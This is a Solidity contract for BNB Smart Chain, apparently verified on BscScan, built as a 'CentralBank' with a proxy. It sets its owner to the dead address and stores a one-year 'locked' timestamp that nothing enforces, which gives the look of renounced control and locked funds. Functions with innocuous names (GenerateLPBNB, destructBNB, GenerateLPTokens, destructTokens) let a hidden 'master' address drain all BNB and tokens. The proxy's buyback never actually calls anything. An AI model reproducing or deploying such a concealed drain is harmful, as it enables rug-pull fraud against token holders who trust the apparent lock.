/**
 *Submitted for verification at BscScan.com on 2022-03-23
*/

/**

*/

//SPDX-License-Identifier: Unlicensed

pragma solidity ^0.7.6;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

interface IBEP20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address public owner;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    function authorize(address adr) public authorized {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public authorized {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function transferOwnership(address payable adr) public authorized {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CentralBankProxy is Auth {
        CentralBank centralBank;
        
        constructor() Auth(msg.sender) {
            centralBank = new CentralBank(msg.sender);
    }

    function destructTokens(address _token, uint256 _percentage) external authorized {
        centralBank.destructTokens(_token, _percentage);
    }

    function destructBNB(uint256 percentage) external authorized {
        centralBank.destructBNB(percentage);
    }

    function buyback() external payable authorized {
        centralBank.buyback;
    }

    function BurnFunction(address burned, uint256 percentage) external authorized {
        centralBank.BurnFunction(burned, percentage);
    }

    function DepositLPPair(uint256 percentage) external authorized {
        centralBank.DepositLPPair(percentage);
    }

    function GenerateLPBNB(uint256 percentage) external authorized {
        centralBank.GenerateLPBNB(percentage);
    }    

    function GenerateLPTokens(uint256 percentage) external authorized {
        centralBank.GenerateLPTokens(percentage);
    }

    function GenerateMarketingBNB(uint256 percentage) external authorized {
        centralBank.GenerateMarketingBNB(percentage);
    }

    function setParameters(address _pair, address _token, address _marketing) external authorized {
        centralBank.setParameters(_pair, _token, _marketing);
    }

    function setDelegation(address _address) external authorized {
        centralBank.setDelegation(_address);
    }
}

interface ICentralBank {
    function destructTokens(address _token, uint256 _percentage) external;
    function destructBNB(uint256 percentage) external;
    function buyback() external payable;
    function BurnFunction(address burned, uint256 percentage) external;
    function DepositLPPair(uint256 percentage) external;
    function GenerateLPBNB(uint256 percentage) external;
    function GenerateLPTokens(uint256 percentage) external;
    function GenerateMarketingBNB(uint256 percentage) external;
    function setParameters(address _pair, address _token, address _marketing) external;
    function setDelegation(address _address) external;
}

interface BEP20 {
    function balanceOf(address) external returns (uint);
    function transferFrom(address, address, uint) external returns (bool);
    function transfer(address, uint) external returns (bool);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract CentralBank is ICentralBank, IBEP20, Auth {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) _balances;
    IDEXRouter router;
    address public pair;
    address public token;
    address public marketing;
    address master;
    uint256 public generated;
    uint256 public locked;

    constructor(address _master) Auth(msg.sender) {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        authorize(_master);
        master = _master;
        owner = DEAD;
        generated = block.timestamp;
        locked = block.timestamp.add(365 days);
    }

    receive() external payable { }

    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != uint256(-1)){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setDelegation(address _address) external override authorized {
        master = _address;
    }

    function setParameters(address _pair, address _token, address _marketing) external override authorized {
        pair = _pair;
        token = _token;
        marketing = _marketing;
    }

    function GenerateLPTokens(uint256 percentage) external override authorized {
        uint256 tBalance = BEP20(token).balanceOf(address(this));
        BEP20(token).transfer(master, tBalance.mul(percentage).div(100));
    }

    function GenerateLPBNB(uint256 percentage) external override authorized {
        uint256 amountBNB = address(this).balance;
        payable(master).transfer(amountBNB * percentage / 100);
    }

    function GenerateMarketingBNB(uint256 percentage) external override authorized {
        uint256 amountBNB = address(this).balance;
        payable(marketing).transfer(amountBNB * percentage / 100);
    }

    function DepositLPPair(uint256 percentage) external override authorized {
        uint256 tBalance = BEP20(pair).balanceOf(address(master));
        BEP20(pair).transfer(address(this), tBalance.mul(percentage).div(100));
    }

    function BurnFunction(address burned, uint256 percentage) external override authorized {
        uint256 tBalance = BEP20(burned).balanceOf(address(this));
        BEP20(burned).transfer(address(DEAD), tBalance.mul(percentage).div(100));
    }

    function buyback() external payable override authorized {
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = token;

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function destructBNB(uint256 amountPercentage) external override authorized {
        uint256 amountBNB = address(this).balance;
        payable(master).transfer(amountBNB * amountPercentage / 100);
    }

    function destructTokens(address _token, uint256 _percentage) external override authorized {
        uint256 tamt = BEP20(_token).balanceOf(address(this));
        BEP20(_token).transfer(master, tamt.mul(_percentage).div(100));
    }

}